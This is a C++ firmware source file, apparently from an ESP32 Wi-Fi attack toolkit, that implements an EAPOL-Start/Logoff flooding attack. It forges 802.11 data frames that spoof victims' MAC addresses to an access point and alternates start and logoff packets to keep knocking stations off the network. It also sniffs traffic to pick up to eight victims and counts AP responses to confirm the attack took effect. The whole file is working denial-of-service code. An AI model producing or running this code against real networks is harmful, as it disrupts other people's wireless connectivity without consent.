// EAPOL-Start / EAPOL-Logoff flooding.
//
// Design notes (why it is shaped this way):
//   * EAPOL is not a management frame: it travels inside a ToDS data frame with
//     an LLC/SNAP header for EtherType 0x888E. The AP only looks at the
//     transmitter address, so forging a victim's MAC makes the authenticator act
//     on "the station asked to restart / log off".
//   * Both packet types are alternated every 100 ms per victim: Start alone just
//     re-authenticates, Logoff alone just drops the port once. The damage comes
//     from the flap between the two.
//   * Plain data (subtype 0) and QoS data (subtype 8, TID 6) are both sent, one
//     per tick: wpa_supplicant puts EAPOL in the voice-ish TID 6 on a QoS link,
//     but a non-QoS frame is what a driver recovering from a disassociation sends,
//     and some implementations only accept one of the two.
//   * The module never claims success by itself. The evidence is on the receive
//     side: `eaprxreq` counts EAP packets (EAPOL type 0) the AP sends towards a
//     victim -- that is EAP-Request/Identity, i.e. the 802.1X state machine
//     restarted -- and `eaprxsta` counts EAPOL frames from the real station, i.e.
//     it noticed the logoff and re-authenticated.

#include "eapol.h"
#include "radio.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "tx_guard.h"

namespace {

const uint8_t kSeqHigh = 0xF0;
const uint8_t kSeqLow = 0xFF;

// LLC/SNAP towards EtherType 0x888E (EAP over LAN).
const uint8_t kSnapEapol[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};

const uint8_t kEapolVersion = 0x02;  // 802.1X-2004
const uint8_t kEapolStart = 1;
const uint8_t kEapolLogoff = 2;
const uint8_t kEapolPacket = 0;  // EAP-Packet: what an authenticator answers with

// One frame per victim per 50 ms. 20 frames/s is the measured ceiling for unicast
// management/data injection on this driver: at 50 frames/s the short-frame pool is
// full after ~63 frames and the chip restarts (tx_guard.h), while 20 frames/s runs
// for minutes. Broadcast frames (the TIM/TSF clone) are exempt because they are not
// acknowledged and the driver returns their buffer immediately.
const uint32_t kSendMs = 50;
const int kMaxClients = 8;

bool s_active;
uint8_t s_bssid[6];
uint8_t s_channel;
int8_t s_tid = 6;  // -1 = plain data frame only
uint8_t s_next_type = kEapolStart;
bool s_next_qos;
uint32_t s_last_tx_ms;
int s_cursor;

uint32_t s_frames;
uint32_t s_start_frames;
uint32_t s_logoff_frames;
uint32_t s_rx_from_ap;
uint32_t s_rx_eap_packets;
uint32_t s_rx_from_sta;

struct client_t {
    uint8_t mac[6];
    uint32_t sent;
};

client_t s_clients[kMaxClients];
int s_client_count;

int note_client(const uint8_t* mac) {
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    if (memcmp(mac, s_bssid, 6) == 0 || (mac[0] & 0x01) != 0) {
        return -1;
    }
    if (s_client_count >= kMaxClients) {
        return -1;
    }
    memset(&s_clients[s_client_count], 0, sizeof(client_t));
    memcpy(s_clients[s_client_count].mac, mac, 6);
    return s_client_count++;
}

// ToDS data frame: header | [QoS control] | LLC/SNAP | EAPOL header, no payload.
size_t build_eapol(uint8_t* frame, const uint8_t sta[6], uint8_t packet_type, bool qos,
                   int8_t tid) {
    memset(frame, 0, 40);
    frame[0] = qos ? 0x88 : 0x08;  // data / QoS data
    frame[1] = 0x01;               // ToDS
    memcpy(frame + 4, s_bssid, 6);   // Addr1 = RA = the AP
    memcpy(frame + 10, sta, 6);      // Addr2 = TA = the victim we impersonate
    memcpy(frame + 16, s_bssid, 6);  // Addr3 = SA = the AP
    frame[22] = kSeqHigh;
    frame[23] = kSeqLow;
    size_t n = 24;
    if (qos) {
        // QoS control: TID in bits 0..3, normal acknowledgement.
        frame[n++] = (uint8_t)((tid < 0 ? 0 : tid) & 0x0F);
        frame[n++] = 0x00;
    }
    memcpy(frame + n, kSnapEapol, sizeof(kSnapEapol));
    n += sizeof(kSnapEapol);
    frame[n++] = kEapolVersion;
    frame[n++] = packet_type;
    frame[n++] = 0x00;  // body length 0
    frame[n++] = 0x00;
    return n;
}

}  // namespace

bool eapol_start(int index, int8_t qos_tid) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = WiFi.channel(index);
    s_tid = (qos_tid >= 0 && qos_tid <= 7) ? qos_tid : -1;
    s_active = true;
    s_frames = 0;
    s_start_frames = 0;
    s_logoff_frames = 0;
    s_rx_from_ap = 0;
    s_rx_eap_packets = 0;
    s_rx_from_sta = 0;
    s_client_count = 0;
    s_next_type = kEapolStart;
    s_next_qos = false;
    s_last_tx_ms = 0;
    s_cursor = 0;

    radio_set_channel("eapol", s_channel);
    attack_sniffer_enable();
    return true;
}

void eapol_stop(void) {
    s_active = false;
}

void eapol_add_station(const uint8_t mac[6]) {
    note_client(mac);
}

void eapol_step(void) {
    if (!s_active) {
        return;
    }
    if (s_client_count == 0) {
        return;
    }
    const uint32_t now = millis();
    if (s_last_tx_ms != 0 && now - s_last_tx_ms < kSendMs) {
        return;
    }
    s_last_tx_ms = now;
    // One frame per tick, round-robin over the victims: the pacing budget belongs to
    // the radio, not to each station, so eight victims must not mean eight times the
    // injection rate.
    if (s_cursor >= s_client_count) {
        s_cursor = 0;
    }
    client_t* c = &s_clients[s_cursor];
    s_cursor = (s_cursor + 1) % s_client_count;

    uint8_t frame[40];
    const size_t len = build_eapol(frame, c->mac, s_next_type, s_next_qos, s_tid);
    if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        c->sent++;
        if (s_next_type == kEapolStart) {
            s_start_frames++;
        } else {
            s_logoff_frames++;
        }
        // Alternate packet type and frame shape independently, so every victim sees
        // all four combinations within four sends.
        s_next_type = (s_next_type == kEapolStart) ? kEapolLogoff : kEapolStart;
        s_next_qos = !s_next_qos;
    }
}

void eapol_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (!s_active || type != 2 || len < 24) {
        return;
    }
    // An encrypted payload cannot carry a cleartext LLC/SNAP header: matching
    // 0x888E inside ciphertext is how a receiver ends up counting noise as EAPOL.
    if ((frame[1] & 0x40) != 0) {
        return;
    }

    // Data header length: QoS control and the fourth address are optional.
    size_t header = 24;
    if ((frame[1] & 0x03) == 0x03) {
        header += 6;  // ToDS and FromDS both set -> Addr4 present
    }
    if ((subtype & 0x08) != 0) {
        header += 2;  // QoS control
    }
    if ((frame[1] & 0x80) != 0) {
        header += 4;  // +HTC
    }
    if (len < header + 8 + 4) {
        return;
    }
    const uint8_t* p = frame + header;
    if (p[0] != 0xAA || p[1] != 0xAA || p[2] != 0x03) {
        return;
    }
    if (p[6] != 0x88 || p[7] != 0x8E) {
        return;
    }
    const uint8_t eapol_type = p[9];

    // Remember every station of the BSS while we are at it: a client that is
    // talking is a client worth logging off.
    const uint8_t* src = frame + 10;
    const bool from_ap = memcmp(src, s_bssid, 6) == 0;
    if (from_ap) {
        s_rx_from_ap++;
        if (eapol_type == kEapolPacket) {
            s_rx_eap_packets++;
        }
        note_client(frame + 4);
    } else {
        s_rx_from_sta++;
        note_client(src);
    }
}

void eapol_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }

    uint8_t frame[40];
    const size_t plain = build_eapol(frame, fake_sta, kEapolStart, false, s_tid);
    Serial.printf("EAPOLTEST start plain len=%u fc=0x%02X%02X snap=%02X%02X%02X etype=%02X%02X"
                  " ver=%u type=%u body_len=%u\n",
                  (unsigned)plain, (unsigned)frame[1], (unsigned)frame[0], (unsigned)frame[24],
                  (unsigned)frame[25], (unsigned)frame[26], (unsigned)frame[30],
                  (unsigned)frame[31], (unsigned)frame[32], (unsigned)frame[33],
                  (unsigned)(frame[34] | (frame[35] << 8)));
    Serial.print("EAPOLTEST start hex=");
    for (size_t i = 0; i < plain; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    const size_t qos = build_eapol(frame, fake_sta, kEapolLogoff, true, s_tid);
    Serial.printf("EAPOLTEST logoff qos len=%u tid=%u ver=%u type=%u\n", (unsigned)qos,
                  (unsigned)(frame[24] & 0x0F), (unsigned)frame[34], (unsigned)frame[35]);
    Serial.print("EAPOLTEST logoff hex=");
    for (size_t i = 0; i < qos; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();
}

bool eapol_active(void) {
    return s_active;
}

uint32_t eapol_frames(void) {
    return s_frames;
}

uint32_t eapol_clients(void) {
    return (uint32_t)s_client_count;
}

uint32_t eapol_start_frames(void) {
    return s_start_frames;
}

uint32_t eapol_logoff_frames(void) {
    return s_logoff_frames;
}

uint32_t eapol_rx_from_ap(void) {
    return s_rx_from_ap;
}

uint32_t eapol_rx_eap_packets(void) {
    return s_rx_eap_packets;
}

uint32_t eapol_rx_from_sta(void) {
    return s_rx_from_sta;
}

int8_t eapol_qos_tid(void) {
    return s_tid;
}
